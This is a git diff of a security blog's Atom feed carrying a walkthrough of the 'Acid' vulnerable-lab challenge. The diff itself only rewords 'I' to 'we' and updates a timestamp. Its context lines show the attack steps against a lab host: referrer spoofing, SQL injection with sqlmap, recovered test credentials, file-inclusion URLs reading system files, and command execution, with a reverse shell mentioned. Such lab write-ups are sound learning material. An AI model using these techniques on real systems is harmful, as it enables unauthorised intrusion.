@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Acid | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/acid/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-08-24T16:06:27+02:00</updated>
+  <updated>2015-08-25T13:02:16+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -140,8 +140,7 @@
 </span><span class='line'>&lt;p>root@kali32:~# curl -s &lt;a href="http://192.168.80.158:33447/Challenge/acid.txt">http://192.168.80.158:33447/Challenge/acid.txt&lt;/a>
 </span><span class='line'>/protected_page.php</span></code></pre></td></tr></table></div></figure></p>
 
-<p>We had no further access for <code>/protected_page.php</code>, but the first idea that I had was
-referrer check. After verifying by spoofing this value:</p>
+<p>We had no further access for <code>/protected_page.php</code>, but the first idea that we had was a referrer check. After verifying by spoofing this value:</p>
 
 <p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -213,10 +212,10 @@ referrer check. After verifying by spoofing this value:</p>
 </span><span class='line'>..
 </span></code></pre></td></tr></table></div></figure></p>
 
-<p>Proceeding further, there are a few hints for sql injection, but nothing that I tried worked:
+<p>Proceeding further, there are a few hints for sql injection, but nothing that we have tried worked:
 <a href="http://192.168.80.158:33447/Challenge/hacked.php?id=33&amp;add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?id=33&amp;add=Add+ID</a></p>
 
-<p>I was trying sqlmap or manual identification without success, however Burp
+<p>Trying sqlmap or manual identification was without success, however Burp
 Suite Scanner revealed, that the parameter ID is vulnerable, when it&rsquo;s sent in POST
 method:</p>
 
@@ -256,7 +255,7 @@ method:</p>
 </span><span class='line'><span class="nt">&lt;p&gt;</span>Could not enter data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <span class="ni">&amp;lsquo;</span>&#39;1<span class="ni">&amp;rsquo;&amp;lsquo;</span>))<span class="ni">&amp;rsquo;</span> at line
 </span></code></pre></td></tr></table></div></figure></p>
 
-<p>Now I can use sqlmap and retrieve some useful information:
+<p>Now we can use sqlmap and retrieve some useful information:
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -332,7 +331,7 @@ method:</p>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>Username: test_user
-</span><span class='line'>Email: &lt;a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#116;&#x65;&#115;&#116;&#64;&#101;&#120;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#99;&#x6f;&#109;">&#116;&#x65;&#x73;&#x74;&#64;&#101;&#120;&#97;&#x6d;&#112;&#x6c;&#x65;&#46;&#x63;&#111;&#109;&lt;/a>
+</span><span class='line'>Email: &lt;a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x74;&#101;&#x73;&#116;&#64;&#x65;&#x78;&#97;&#109;&#x70;&#x6c;&#101;&#x2e;&#99;&#x6f;&#109;">&#116;&#x65;&#x73;&#116;&#x40;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;&lt;/a>
 </span><span class='line'>Password: 6ZaxN2Vzm9NUJT2y</span></code></pre></td></tr></table></div></figure></p>
 
 <p>We log in and proceed to the text step:
@@ -438,7 +437,7 @@ method:</p>
 </pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File&lt;/a>
 </span><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File&lt;/a></span></code></pre></td></tr></table></div></figure></p>
 
-<p>I gave up hacking via /proc, but dirb reveals another files:
+<p>We gave up hacking via /proc, but dirb reveals another files:
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -490,7 +489,7 @@ method:</p>
 </span><span class='line'>+ &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php&lt;/a> (CODE:200|SIZE:54)
 </span><span class='line'>+ &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php&lt;/a> (CODE:200|SIZE:74)</span></code></pre></td></tr></table></div></figure></p>
 
-<p>Now I understand from the index page the sentence <code>Fairy tails uses secret keys to open the magical doors.</code></p>
+<p>Now we understand from the index page the sentence <code>Fairy tails uses secret keys to open the magical doors.</code></p>
 
 <p>Seems that we almost won, because RCE (OS Commanding) on <a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php.">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php.</a></p>
 
@@ -548,7 +547,7 @@ method:</p>
 </span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure></p>
 
 <p>We realized after a few seconds, that there is no nc with executable property,
-no curl, no wget and no writable place in DocumentRoot on obvious place, I tried
+no curl, no wget and no writable place in DocumentRoot on obvious place, we tried
 to store something to <code>/var/www/html/</code>. We could send anything over netcat, but
 using python reverse shell could be more efficient:</p>
 
